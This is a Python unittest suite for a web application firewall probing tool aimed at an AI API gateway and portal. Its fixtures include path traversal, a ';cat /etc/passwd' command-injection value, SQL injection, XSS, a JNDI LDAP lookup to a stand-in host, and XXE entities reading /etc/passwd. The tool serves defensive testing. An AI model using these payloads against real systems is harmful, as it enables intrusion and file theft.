"""WAF probe evidence must preserve auth boundaries, attribution and secrecy."""
from collections import Counter
import base64
import io
from dataclasses import replace
import importlib.util
import json
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
import wave
from xml.etree import ElementTree
from unittest.mock import patch
from urllib.parse import parse_qs, urlsplit

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
import waf_probe as probe


class WafProbeTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.routes = probe.load_routes()
        cls.cases = probe.build_corpus(cls.routes)

    def test_every_contract_operation_and_portal_handler_has_a_baseline(self):
        expected = {(route.target, route.method, route.path) for route in self.routes}
        actual = {(case.target, case.method, case.path) for case in self.cases if case.category == "baseline"}
        self.assertEqual(actual, expected)
        for path in (ROOT / "apps/gateway/apim/apis").glob("*.json"):
            contract = json.loads(path.read_text(encoding="utf-8"))
            for operation in contract["operations"]:
                self.assertIn(contract["name"] + ":" + operation["name"], {route.operation for route in self.routes})
        self.assertIn(("gateway", "POST", "/tools/pii-v1-mcp/mcp"), expected)
        self.assertIn(("gateway", "GET", "/auth/connections/browser/callback"), expected)
        self.assertIn(("portal", "GET", "/api/auth/callback/microsoft"), expected)
        self.assertIn(("portal", "PUT", "/api/api-keys/00000000-0000-4000-8000-000000000000/limits"), expected)
        self.assertIn(("portal", "GET", "/en/login"), expected)

    def test_corpus_is_large_unique_deterministic_and_includes_meaningful_families(self):
        self.assertGreater(len(self.cases), 1000)
        ids = [case.case_id for case in self.cases]
        self.assertEqual(len(ids), len(set(ids)))
        self.assertEqual(ids, [case.case_id for case in probe.build_corpus(self.routes)])
        categories = {case.category for case in self.cases}
        self.assertTrue({"content-sql-select", "content-html-script", "content-regex", "content-shell-source",
            "content-escaped-controls", "content-unicode-normalization", "content-opaque-base64", "json-array",
            "binary-mime", "size-boundary", "inspection-boundary", "websocket-upgrade", "multipart-audio",
            "attack-sqli", "attack-traversal", "attack-xss"}.issubset(categories))

    def test_deployment_routes_use_every_model_in_the_canonical_allowlist(self):
        for path in (ROOT / "apps/gateway/apim/apis").glob("*.json"):
            api = json.loads(path.read_text(encoding="utf-8"))
            for operation in api["operations"]:
                if "{deployment}" not in operation["urlTemplate"]:
                    continue
                constraint = api["authorization"]["operationConstraints"][operation["name"]]
                actual = {route.path for route in self.routes if route.operation == api["name"] + ":" + operation["name"]}
                expected = {"/" + api["path"] + operation["urlTemplate"].replace("{deployment}", model) for model in constraint["allowedModels"]}
                self.assertEqual(actual, expected)
                self.assertFalse(any("invalid-model" in route for route in actual))

    def test_exclusion_boundaries_keep_control_inputs_and_neighboring_paths_anonymous(self):
        controls = probe.boundary_controls(self.routes)
        self.assertGreater(len(controls), 100)
        self.assertLess(len(controls), 350)
        attacks = [case for case in controls if case.intent == "attack_control"]
        for case in controls:
            self.assertEqual(case.auth_mode, "anonymous")
            self.assertEqual(case.method, "POST")
        routes = {(case.target, case.path) for case in controls if case.category == "control-field-model"}
        for target, path in routes:
            with self.subTest(target=target, path=path):
                categories = {case.category for case in attacks if case.target == target and case.path == path}
                self.assertTrue({"control-field-model", "control-field-unknown", "control-header", "control-query"}.issubset(categories))
                self.assertTrue(any(case.target == target and case.path == path + "/neighbor" and case.category == "control-neighbor-path" for case in attacks))
        for case in controls:
            if case.category == "data-query-name-collision":
                self.assertEqual(case.intent, "validation")
                self.assertEqual(len(case.query), 1)
                self.assertEqual(case.query[0][1], probe.CONTROL_SQL)
        query_cases = [case for case in controls if case.path == "/models/openai/v1/chat/completions" and case.category == "data-query-name-collision"]
        self.assertTrue({"messages", "content", "tools", "arguments"}.issubset({case.query[0][0] for case in query_cases}))
        model_case = next(case for case in controls if case.path == "/models/openai/v1/chat/completions" and case.category == "control-field-model")
        value = json.loads(model_case.body)
        self.assertEqual(value["model"], probe.CONTROL_SQL)
        self.assertEqual(value["messages"][0]["content"], "Synthetic exclusion boundary baseline")
        header_case = next(case for case in controls if case.path == model_case.path and case.category == "control-header")
        self.assertEqual(dict(header_case.headers)["X-Attack"], probe.CONTROL_SQL)
        self.assertNotEqual(json.loads(header_case.body)["model"], probe.CONTROL_SQL)
        result = probe.classify_response(403, {}, b"403 Forbidden Microsoft-Azure-Application-Gateway/v2", intent="attack_control")
        self.assertTrue(result["attack_block_evidence"])

    def test_every_declared_binary_media_type_has_a_signature_fixture(self):
        signatures = {"application/pdf": b"%PDF-", "image/png": b"\x89PNG\r\n\x1a\n", "image/jpeg": b"\xff\xd8\xff", "image/tiff": b"II\x2a\x00", "image/bmp": b"BM", "audio/wav": b"RIFF"}
        for route in self.routes:
            if route.body_format != "binary":
                continue
            for mime in route.content_types:
                with self.subTest(route=route.path, mime=mime):
                    case = next(case for case in self.cases if case.path == route.path and case.category == "binary-mime" and dict(case.headers)["Content-Type"] == mime)
                    self.assertTrue(case.body.startswith(signatures[mime]))
                    self.assertEqual(case.intent, "compatibility")
        for mime, signature in signatures.items():
            self.assertTrue(probe._binary_fixture(mime).startswith(signature))
        multipart = [case for case in self.cases if case.path == "/api/tools/documents" and case.category == "multipart-mime"]
        document_contract = next(route for route in self.routes if route.constraint.get("kind") == "documentAnalysis")
        self.assertEqual(len(multipart), len(document_contract.content_types))
        for mime in document_contract.content_types:
            case = next(case for case in multipart if ("Content-Type: " + mime).encode() in case.body)
            self.assertIn(signatures[mime], case.body)

    def test_real_content_fields_are_exercised_one_at_a_time(self):
        by_path = {}
        for case in self.cases:
            by_path.setdefault(case.path, set()).add(case.payload_field)
        self.assertIn("message", by_path["/api/models/generate"])
        self.assertIn("texts[]", by_path["/api/models/embeddings"])
        self.assertIn("texts[]", by_path["/models/cohere/v1/embed"])
        self.assertTrue({"state.message", "questions.*.instructions", "questions.*.criteria.*", "questions.*.criteria[]"}.issubset(by_path["/models/microsoft-decision/v1/systemone"]))
        self.assertIn("messages[].tool_calls[].function.arguments", by_path["/models/openai/v1/chat/completions"])
        self.assertIn("instructions", by_path["/models/openai/v1/responses"])
        self.assertIn("input[].output", by_path["/models/openai/v1/responses"])
        self.assertIn("params.arguments.text", by_path["/tools/pii-v1-mcp/mcp"])
        for case in self.cases:
            if case.payload_field == "message":
                value = json.loads(case.body)
                self.assertIn("message", value)
                self.assertNotIn("prompt", value)
                self.assertNotIn("input", value)

    def test_extended_generated_fields_are_anonymous_and_separately_selectable(self):
        extended = probe.extended_content(self.routes)
        self.assertGreaterEqual(len(extended), 400)
        self.assertLessEqual(len(extended), 800)
        for case in extended:
            self.assertTrue(case.category.startswith("extended-content-"))
            self.assertEqual(case.auth_mode, "anonymous")
            self.assertEqual(case.intent, "compatibility")
            self.assertIsNotNone(case.payload_field)
        fields = {case.payload_field for case in extended}
        self.assertTrue({"response_format.json_schema.schema.properties.value.pattern",
            "response_format.json_schema.schema.properties.value.enum[]",
            "response_format.json_schema.schema.properties.value.default",
            "response_format.json_schema.schema.properties.value.examples[]",
            "keys:response_format.json_schema.schema.properties", "keys:tools[].parameters.properties",
            "keys:text.format.schema.properties", "input[].arguments", "input[].encrypted_content",
            "messages[].content[].image_url.url", "messages[].content[].input_audio.data",
            "input[].content[].file_data", "input.text", "keys:state", "state", "state[]"}.issubset(fields))
        self.assertTrue(any(".$defs.outer.$defs.inner." in field for field in fields))
        categories = {case.category for case in extended}
        self.assertEqual({case.case_id for case in self.cases if case.category in categories}, {case.case_id for case in extended})

    def test_decision_question_and_criteria_names_vary_without_varying_values(self):
        cases = probe.decision_question_keys(self.routes)
        self.assertEqual(len(cases), len(probe.payloads()) * 4)
        expected_names = {text for _, text in probe.payloads()}
        for target in ("gateway", "portal"):
            questions = [case for case in cases if case.target == target and case.payload_field == "keys:questions"]
            criteria = [case for case in cases if case.target == target and case.payload_field == "keys:questions.q.criteria"]
            self.assertEqual({next(iter(json.loads(case.body)["questions"])) for case in questions}, expected_names)
            self.assertEqual({next(iter(json.loads(case.body)["questions"]["q"]["criteria"])) for case in criteria}, expected_names)
            for case in questions:
                value = next(iter(json.loads(case.body)["questions"].values()))
                self.assertEqual(value, {"type": "noul", "instructions": "Is this a code sample?"})
            for case in criteria:
                value = json.loads(case.body)["questions"]["q"]
                self.assertEqual(value["type"], "choice")
                self.assertEqual(value["instructions"], "Choose a label.")
                self.assertEqual(set(value["criteria"].values()), {"Synthetic choice", "Other choice"})
        for case in cases:
            self.assertEqual(case.category, "extended-content-decision-question-keys")
            self.assertEqual(case.auth_mode, "anonymous")
            self.assertEqual(case.intent, "compatibility")

    def test_raw_guard_is_separate_and_keeps_data_distinct_from_control_positions(self):
        guards = probe.raw_body_guard_controls(self.routes)
        self.assertGreater(len(guards), 100)
        self.assertEqual(len(guards), len({case.case_id for case in guards}))
        self.assertFalse({case.case_id for case in guards} & {case.case_id for case in self.cases})
        baselines = {dict(case.headers)["Content-Type"]: case.body for case in guards if case.category == "raw-guard-baseline"}
        self.assertEqual(set(baselines), {"application/ssml+xml", "audio/wav", "application/pdf"})
        for case in guards:
            with self.subTest(case=case.case_id):
                self.assertEqual(case.target, "gateway")
                self.assertEqual(case.method, "POST")
                self.assertEqual(case.auth_mode, "anonymous")
                self.assertNotIn("api-key", {name.lower() for name, _ in case.headers})
                self.assertNotIn("authorization", {name.lower() for name, _ in case.headers})
                for _, value in case.headers:
                    self.assertFalse(any(character in value for character in "\r\n\x00"))
                if case.category in {"raw-guard-baseline", "raw-guard-body-data"}:
                    self.assertEqual(case.intent, "compatibility")
                    self.assertFalse(case.query)
                    self.assertEqual([name for name, _ in case.headers], ["Content-Type"])
                else:
                    self.assertEqual(case.intent, "attack_control")
                if case.category in {"raw-guard-query", "raw-guard-header", "raw-guard-cookie", "raw-guard-query-null", "raw-guard-casepath-query", "raw-guard-neighbor-query"}:
                    self.assertEqual(case.body, baselines[dict(case.headers)["Content-Type"]])
                if case.category == "raw-guard-header":
                    self.assertIn("X-Header", dict(case.headers))
                    self.assertFalse(case.query)
                    self.assertNotIn("Cookie", dict(case.headers))
                if case.category == "raw-guard-cookie":
                    self.assertTrue(dict(case.headers)["Cookie"].startswith("raw_guard="))
                    self.assertFalse(case.query)
                if case.category == "raw-guard-query-null":
                    url = probe.request_url("https://example.invalid", case)
                    self.assertIn("%00", url)
                    self.assertNotIn("\x00", url)
        self.assertEqual({case.category for case in guards if "/neighbor" in case.path}, {"raw-guard-neighbor-query", "raw-guard-neighbor-body"})
        with self.assertRaises(ValueError):
            probe.raw_body_guard_controls([route for route in self.routes if route.path != "/tools/documents/v1/analyze"])

    def test_raw_guard_attack_bodies_remain_valid_http_contract_fixtures(self):
        for case in probe.raw_body_guard_controls(self.routes):
            with self.subTest(case=case.case_id):
                mime = dict(case.headers)["Content-Type"]
                if mime == "application/ssml+xml":
                    root = ElementTree.fromstring(case.body)
                    self.assertEqual(root.tag, "{http://www.w3.org/2001/10/synthesis}speak")
                    self.assertIsNotNone(root.find("{http://www.w3.org/2001/10/synthesis}voice"))
                    if case.category == "raw-guard-ssml-external-entity":
                        self.assertIn(b'<!ENTITY raw_guard SYSTEM "https://example.invalid/', case.body)
                        self.assertNotIn(b"&raw_guard;", case.body)
                elif mime == "audio/wav":
                    self.assertEqual(int.from_bytes(case.body[4:8], "little"), len(case.body) - 8)
                    with wave.open(io.BytesIO(case.body), "rb") as audio:
                        self.assertEqual(audio.getnchannels(), 1)
                        self.assertEqual(audio.getsampwidth(), 2)
                        self.assertEqual(audio.getframerate(), 16000)
                        self.assertEqual(audio.getnframes(), 160)
                        self.assertEqual(len(audio.readframes(160)), 320)
                elif mime == "application/pdf":
                    self.assertTrue(case.body.startswith(b"%PDF-1.4"))
                    self.assertTrue(case.body.endswith(b"%%EOF\n"))
                    xref = int(case.body.rsplit(b"startxref\n", 1)[1].splitlines()[0])
                    self.assertTrue(case.body[xref:].startswith(b"xref\n0 6\n"))
                    entries = case.body[xref:].splitlines()[3:8]
                    self.assertEqual(len(entries), 5)
                    for number, entry in enumerate(entries, 1):
                        offset = int(entry.split()[0])
                        self.assertTrue(case.body[offset:].startswith(f"{number} 0 obj\n".encode()))
                else:
                    self.fail("unexpected raw guard content type")

    def test_standalone_jndi_fields_and_query_collisions_cover_real_variables(self):
        cases = probe.jndi_field_probes(self.routes)
        literal = "${jndi:ldap://waf-probe.invalid/synthetic}"
        self.assertEqual(len(cases), len({case.case_id for case in cases}))
        self.assertFalse({case.case_id for case in cases} & {case.case_id for case in self.cases})
        expected = set()
        for route in self.routes:
            if route.method != "POST":
                continue
            if route.body_format == "json":
                expected.update((route.target, route.path, field_name) for field_name, _ in probe._json_variants(route, literal) if field_name != "validation_canary")
            if route.target == "gateway" and route.body_format == "multipart":
                expected.add((route.target, route.path, "prompt"))
        expected.add(("portal", "/api/models/speech", "input.text"))
        data = [case for case in cases if case.category == "extended-content-jndi-all-fields"]
        collisions = [case for case in cases if case.category == "data-query-name-collision-jndi"]
        self.assertEqual({(case.target, case.path, case.payload_field) for case in data}, expected)
        self.assertEqual({(case.target, case.path, case.payload_field) for case in collisions}, expected)
        for case in cases:
            self.assertEqual(case.auth_mode, "anonymous")
            self.assertNotIn(case.path, {"/models/azure-speech/v1/synthesize", "/models/azure-speech/v1/recognize", "/tools/documents/v1/analyze", "/api/tools/documents"})
            self.assertFalse({name.lower() for name, _ in case.headers} & {"api-key", "authorization", "cookie"})
            if case.category == "extended-content-jndi-all-fields":
                self.assertEqual(case.intent, "compatibility")
                self.assertIn(literal.encode(), case.body)
                self.assertFalse(case.query)
            elif case.category == "data-query-name-collision-jndi":
                self.assertEqual(case.intent, "validation")
                self.assertEqual(case.query[0][1], literal)
                self.assertNotIn("[]", case.query[0][0])
                self.assertNotIn("*", case.query[0][0])
                self.assertNotIn(literal.encode(), case.body)
            else:
                self.assertEqual(case.intent, "attack_control")
        question = next(case for case in collisions if case.payload_field == "questions.*.criteria.*")
        self.assertEqual(question.query[0][0], "questions.q.criteria.a")
        multipart = next(case for case in data if case.payload_field == "input.text")
        input_part = multipart.body.split(b'name="input"\r\n\r\n', 1)[1].split(b"\r\n--waf-probe-fixed-boundary", 1)[0]
        self.assertEqual(json.loads(input_part)["text"], literal)
        for case in cases:
            if case.category == "jndi-field-control-unknown" and dict(case.headers)["Content-Type"] == "application/json":
                self.assertEqual(json.loads(case.body)["_attack"], literal)
        self.assertEqual({case.payload_field for case in cases if case.path == "/waf-probe/jndi-nonexistent"}, {"query:metadata", "header:X-Attack"})

    def test_jndi_cli_dry_run_selects_only_the_standalone_corpus(self):
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / "jndi-plan.json"
            with patch.object(probe, "run_probe", side_effect=AssertionError("network attempted")):
                code = probe.main(["--jndi-fields-only", "--dry-run", "--output", str(output)])
            self.assertEqual(code, 0)
            report = json.loads(output.read_text(encoding="utf-8"))
            self.assertEqual(report["selected_case_count"], len(probe.jndi_field_probes(self.routes)))
            self.assertTrue(all("jndi" in item["case_id"] for item in report["results"]))

    def test_literal_attack_documentation_is_data_in_real_fields_never_an_xml_request(self):
        cases = probe.adversarial_content(self.routes)
        self.assertGreaterEqual(len(cases), 120)
        counts = Counter((case.target, case.path) for case in cases)
        self.assertEqual(set(counts.values()), {6})
        self.assertIn(("gateway", "/models/openai/v1/chat/completions"), counts)
        self.assertIn(("gateway", "/tools/pii-v1-mcp/mcp"), counts)
        self.assertIn(("portal", "/api/models/generate"), counts)
        self.assertIn(("gateway", "/models/openai-audio/v1/deployments/gpt-transcribe/transcriptions"), counts)
        def strings(value):
            if isinstance(value, str):
                yield value
            elif isinstance(value, dict):
                for child in value.values():
                    yield from strings(child)
            elif isinstance(value, list):
                for child in value:
                    yield from strings(child)
        expected = {"literal-lfi": "../../etc/passwd", "literal-rce": ";cat /etc/passwd",
            "literal-sqli": "1' OR '1'='1' UNION SELECT NULL--", "literal-xss": "<img src=x onerror=alert(1)>",
            "literal-jndi": "${jndi:ldap://waf-probe.invalid/synthetic}",
            "literal-xxe": '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'}
        for case in cases:
            with self.subTest(case=case.case_id):
                self.assertEqual(case.category, "extended-content-literal-attack-documentation")
                self.assertEqual(case.auth_mode, "anonymous")
                self.assertEqual(case.intent, "compatibility")
                self.assertIsNotNone(case.payload_field)
                self.assertNotIn("xml", dict(case.headers)["Content-Type"])
                label = next(label for label in expected if label in case.case_id)
                literal = "Analyze the following inert source text: " + expected[label]
                if dict(case.headers)["Content-Type"] == "application/json":
                    value = json.loads(case.body)
                    self.assertTrue(any(literal in text for text in strings(value)))
                    self.assertNotIn("_attack", value)
                    self.assertNotEqual(value.get("model"), literal)
                else:
                    self.assertEqual(case.payload_field, "prompt")
                    self.assertIn(literal.encode(), case.body)

    def test_schema_keys_and_nested_arguments_retain_the_exact_generated_payload(self):
        extended = probe.extended_content(self.routes)
        sql = dict(probe.payloads())["sql-union"]
        key_case = next(case for case in extended if case.payload_field == "keys:response_format.json_schema.schema.properties" and "sql-union" in case.case_id)
        properties = json.loads(key_case.body)["response_format"]["json_schema"]["schema"]["properties"]
        self.assertEqual(set(properties), {sql})
        case = next(case for case in extended if case.payload_field == "input[].arguments" and "sql-union" in case.case_id)
        arguments = json.loads(json.loads(case.body)["input"][0]["arguments"])
        self.assertEqual(arguments["value"], sql)
        key_cases = [case for case in extended if case.payload_field == "keys:state" and "sql-union" in case.case_id]
        self.assertEqual({case.target for case in key_cases}, {"gateway", "portal"})
        for case in key_cases:
            self.assertEqual(set(json.loads(case.body)["state"]), {sql})
        scalar_cases = [case for case in extended if case.category == "extended-content-decision-state-scalar-json"]
        self.assertEqual({type(json.loads(case.body)["state"]) for case in scalar_cases}, {int, float, bool, type(None)})

    def test_extended_media_and_multipart_carry_the_payload_in_actual_fields(self):
        extended = probe.extended_content(self.routes)
        image = next(case for case in extended if case.payload_field == "messages[].content[].image_url.url")
        value = json.loads(image.body)["messages"][0]["content"][1]["image_url"]["url"]
        self.assertTrue(value.startswith("data:image/png;base64,"))
        self.assertTrue(base64.b64decode(value.split(",", 1)[1], validate=True).startswith(b"\x89PNG\r\n\x1a\n"))
        audio = next(case for case in extended if case.payload_field == "messages[].content[].input_audio.data")
        value = json.loads(audio.body)["messages"][0]["content"][0]["input_audio"]["data"]
        self.assertTrue(base64.b64decode(value, validate=True).startswith(b"RIFF"))
        document = next(case for case in extended if case.payload_field == "input[].content[].file_data")
        value = json.loads(document.body)["input"][0]["content"][1]["file_data"]
        self.assertTrue(base64.b64decode(value.split(",", 1)[1], validate=True).startswith(b"%PDF-"))
        sql = dict(probe.payloads())["sql-union"]
        multipart = next(case for case in extended if case.payload_field == "input.text" and "sql-union" in case.case_id)
        input_part = multipart.body.split(b'name="input"\r\n\r\n', 1)[1].split(b"\r\n--waf-probe-fixed-boundary", 1)[0]
        self.assertEqual(json.loads(input_part)["text"], sql)

    def test_bfl_edit_probes_include_raw_base64_image_without_broadening_auth(self):
        cases = [case for case in probe.extended_content(self.routes)
                 if case.category == "extended-content-bfl-edit-image-base64"]
        self.assertEqual(len(cases), 8)
        for case in cases:
            self.assertEqual(case.path, "/models/blackforestlabs/v1/flux-2/edits")
            self.assertEqual(case.payload_field, "input_image")
            self.assertEqual(case.auth_mode, "anonymous")
            value = json.loads(case.body)
            self.assertFalse(value["input_image"].startswith("data:"))
            self.assertTrue(base64.b64decode(value["input_image"], validate=True).startswith(b"\x89PNG\r\n\x1a\n"))

    def test_keys_are_exclusively_invalid_model_canaries(self):
        keyed = [case for case in self.cases if case.auth_mode != "anonymous"]
        self.assertGreater(len(keyed), 32)
        for case in keyed:
            self.assertEqual(case.target, "gateway")
            self.assertIn((case.method, case.path), probe.CANARY_ROUTES)
            self.assertEqual(json.loads(case.body)["model"], probe.INVALID_MODEL)
            self.assertEqual(case.intent, "compatibility")
        for case in self.cases:
            if case.intent == "attack-control":
                self.assertEqual(case.auth_mode, "anonymous")
                self.assertEqual(case.method, "GET")
                self.assertNotIn((case.method, case.path), {(route.method, route.path) for route in self.routes})
        canary = keyed[0]
        result = probe.run_probe(canary, "https://example.invalid", "run", 1, probe.RateLimiter(4))
        self.assertEqual(result["classification"], "skipped_key_required")
        with self.assertRaises(ValueError):
            probe.run_probe(replace(canary, target="portal"), "https://example.invalid", "run", 1, probe.RateLimiter(4), "fake-secret")

    def test_403_attribution_does_not_equate_every_forbidden_with_waf(self):
        for status, headers, body, expected in (
            (403, {}, b"<title>403 Forbidden</title><center>Microsoft-Azure-Application-Gateway/v2</center>", "waf_block"),
            (403, {"server": "Microsoft-Azure-Application-Gateway/v2"}, b'{"error":"RequestNotAllowed"}', "forbidden_unattributed"),
            (403, {"apim-request-id": "synthetic"}, b'{"error":"denied"}', "application_rejected"),
            (401, {}, b"Unauthorized", "application_rejected"),
            (400, {}, b"Invalid model", "application_validation_or_route_response"),
            (302, {"location": "https://other.invalid"}, b"", "redirect_not_followed"),
            (429, {}, b"", "rate_limited"),
            (502, {}, b"", "server_error"),
        ):
            with self.subTest(status=status, expected=expected):
                result = probe.classify_response(status, headers, body)
                self.assertEqual(result["classification"], expected)
                self.assertFalse(result["functional_success"])
        result = probe.classify_response(200, {}, b"ok", auth_mode="invalid-model-canary")
        self.assertEqual(result["classification"], "canary_unexpected_success")

    def test_ssml_guard_requires_explicit_error_code_and_status(self):
        body = b'{"error":{"code":"InvalidSpeechMarkup"}}'
        rejected = probe.classify_response(400, {}, body)
        self.assertEqual(rejected['evidence'], 'apim-ssml-dtd-rejection')
        self.assertEqual(rejected['classification'], 'application_validation_or_route_response')
        for status, data in [(401, body), (400, b'{"error":{"code":"OtherError"}}'), (400, b'InvalidSpeechMarkup')]:
            with self.subTest(status=status, body=data):
                self.assertNotEqual(probe.classify_response(status, {}, data)['evidence'], 'apim-ssml-dtd-rejection')

    def test_manifest_and_exception_records_do_not_include_secrets_or_payload(self):
        secret, payload = "sentinel-secret-private", "sentinel-body-private"
        case = probe.Probe("secret-test", "gateway", "POST", "/waf-probe/nonexistent", "test", "compatibility", "test",
            payload.encode(), (("X-Test", secret),), (("metadata", payload),))
        serialized = json.dumps(probe.metadata(case))
        self.assertNotIn(secret, serialized)
        self.assertNotIn(payload, serialized)
        with patch.object(probe, "_curl_response", side_effect=OSError(secret + payload)):
            record = probe.run_probe(case, "https://example.invalid", "synthetic-run", 1, probe.RateLimiter(4), transport="curl")
        serialized = json.dumps(record)
        self.assertNotIn(secret, serialized)
        self.assertNotIn(payload, serialized)
        self.assertEqual(record["error_type"], "OSError")
        self.assertFalse(record["functional_success"])

    def test_correlation_is_in_the_user_agent_and_probe_queries_are_unchanged(self):
        case = probe.Probe("correlation-fixture", "gateway", "POST", "/probe?existing=1&empty=", "test", "compatibility", "test",
            b"synthetic", (), (("repeated", "first"), ("repeated", "second"), ("null", "\x00")))
        expected_query = {"existing": ["1"], "empty": [""], "repeated": ["first", "second"], "null": ["\x00"]}
        self.assertEqual(parse_qs(urlsplit(probe.request_url("https://example.invalid", case)).query, keep_blank_values=True), expected_query)
        with patch.object(probe, "_curl_response", return_value=(401, {}, b"Unauthorized")) as send:
            record = probe.run_probe(case, "https://example.invalid", "synthetic-run", 1, probe.RateLimiter(4), transport="curl")
        url, method, headers, body, _ = send.call_args.args
        self.assertEqual(parse_qs(urlsplit(url).query, keep_blank_values=True), expected_query)
        self.assertEqual(headers["User-Agent"], "egakumi-waf-probe/1.0 " + record["correlation"])
        self.assertRegex(record["correlation"], r"^[A-Za-z0-9]{1,56}$")
        self.assertEqual((method, body), (case.method, case.body))
        self.assertNotIn("headers", record)
        self.assertNotIn(headers["User-Agent"], json.dumps(record))

    def test_both_transports_send_the_same_exact_user_agent_and_no_marker_query(self):
        case = probe.Probe("transport-correlation-fixture", "gateway", "GET", "/probe", "test", "compatibility", "test",
            headers=(("User-Agent", "untrusted-case-value"),))
        with patch.object(probe, "_curl_response", return_value=(401, {}, b"Unauthorized")) as curl:
            curl_record = probe.run_probe(case, "https://example.invalid", "synthetic-run", 1, probe.RateLimiter(4), transport="curl")
        with patch.object(probe, "build_opener") as opener:
            response = opener.return_value.open.return_value
            response.code, response.headers = 401, {}
            response.read1.return_value = b"Unauthorized"
            urllib_record = probe.run_probe(case, "https://example.invalid", "synthetic-run", 1, probe.RateLimiter(4))
        request = opener.return_value.open.call_args.args[0]
        expected = "egakumi-waf-probe/1.0 " + curl_record["correlation"]
        self.assertEqual(curl_record["correlation"], urllib_record["correlation"])
        self.assertEqual(curl.call_args.args[2]["User-Agent"], expected)
        self.assertEqual(request.get_header("User-agent"), expected)
        self.assertEqual(request.full_url, "https://example.invalid/probe")
        self.assertEqual(curl.call_args.args[0], request.full_url)

    def test_user_agent_rejects_unbounded_or_non_alphanumeric_correlation(self):
        self.assertEqual(probe.probe_user_agent("a" * 56), "egakumi-waf-probe/1.0 " + "a" * 56)
        for value in ("", "a" * 57, "contains spaces", "line\r\nbreak", "non-ascii-\u3042"):
            with self.subTest(value=value), self.assertRaises(ValueError):
                probe.probe_user_agent(value)

    def test_user_agent_casefold_keeps_one_marker_and_other_headers_in_both_transports(self):
        case = probe.Probe("mixed-case-user-agent-fixture", "gateway", "GET", "/probe", "test", "compatibility", "test",
            headers=(("user-agent", "untrusted-lowercase"), ("UsEr-AgEnT", "untrusted-mixedcase"),
                ("USER-AGENT", "untrusted-uppercase"), ("X-Synthetic", "preserved")))
        with patch.object(probe, "_curl_response", return_value=(401, {}, b"Unauthorized")) as curl:
            record = probe.run_probe(case, "https://example.invalid", "synthetic-run", 1, probe.RateLimiter(4), transport="curl")
        with patch.object(probe, "build_opener") as opener:
            response = opener.return_value.open.return_value
            response.code, response.headers = 401, {}
            response.read1.return_value = b"Unauthorized"
            probe.run_probe(case, "https://example.invalid", "synthetic-run", 1, probe.RateLimiter(4))
        request = opener.return_value.open.call_args.args[0]
        expected = "egakumi-waf-probe/1.0 " + record["correlation"]
        for headers in (curl.call_args.args[2].items(), request.header_items()):
            pairs = list(headers)
            self.assertEqual([(name.casefold(), value) for name, value in pairs if name.casefold() == "user-agent"],
                [("user-agent", expected)])
            self.assertIn(("x-synthetic", "preserved"), [(name.casefold(), value) for name, value in pairs])

    def test_tls_and_redirect_boundaries(self):
        self.assertEqual(probe.validate_base_url("https://gateway.example.invalid/"), "https://gateway.example.invalid")
        for url in ("http://example.invalid", "https://secret@example.invalid", "https://example.invalid/path", "https://example.invalid?key=secret", "https://example.invalid/#fragment"):
            with self.subTest(url=url), self.assertRaises(ValueError):
                probe.validate_base_url(url)
        self.assertIsNone(probe.NoRedirect().redirect_request(None, None, 302, "redirect", {}, "https://other.invalid"))

    def test_curl_keeps_credentials_out_of_process_arguments_and_deletes_temporary_files(self):
        recorded = {}
        def fake_run(arguments, **kwargs):
            recorded["arguments"] = arguments
            recorded["kwargs"] = kwargs
            request_headers = Path(arguments[arguments.index("--header") + 1][1:])
            recorded["directory"] = request_headers.parent
            self.assertIn("api-key: sentinel-private-key", request_headers.read_text(encoding="utf-8"))
            Path(arguments[arguments.index("--dump-header") + 1]).write_bytes(b"HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\n\r\n")
            Path(arguments[arguments.index("--output") + 1]).write_bytes(b'{"error":"Synthetic"}')
            return subprocess.CompletedProcess(arguments, 0, b"403", b"")
        with patch.object(probe.subprocess, "run", side_effect=fake_run):
            status, headers, body = probe._curl_response("https://example.invalid/", "POST", {"api-key": "sentinel-private-key"}, b"synthetic", 5)
        self.assertEqual(status, 403)
        self.assertNotIn("sentinel-private-key", " ".join(recorded["arguments"]))
        self.assertFalse(recorded["kwargs"]["shell"])
        self.assertNotIn("--insecure", recorded["arguments"])
        self.assertNotIn("--location", recorded["arguments"])
        self.assertEqual(recorded["arguments"][1], "-q")
        self.assertFalse(recorded["directory"].exists())

    def test_dry_run_requires_no_network_and_does_not_read_key(self):
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / "plan.json"
            with patch.object(probe, "run_probe", side_effect=AssertionError("network attempted")):
                code = probe.main(["--dry-run", "--case-filter", "baseline", "--key-file", str(Path(directory) / "missing-secret"), "--output", str(output)])
            self.assertEqual(code, 0)
            report = json.loads(output.read_text(encoding="utf-8"))
            self.assertTrue(report["dry_run"])
            self.assertEqual(report["selected_case_count"], len(self.routes))


if __name__ == "__main__":
    unittest.main()
